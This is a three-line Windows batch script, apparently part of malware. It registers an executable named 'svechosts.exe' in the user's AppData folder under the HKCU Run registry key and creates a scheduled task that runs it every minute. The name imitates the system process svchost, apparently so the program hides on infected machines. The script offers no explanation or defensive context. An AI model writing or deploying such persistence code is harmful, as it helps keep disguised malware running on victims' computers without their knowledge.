@echo off
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v svechosts /t REG_SZ /d %appdata%\svechosts.exe /f
schtasks /CREATE /SC Minute /MO 1 /TR %appdata%\svechosts.exe /TN svechosts /F
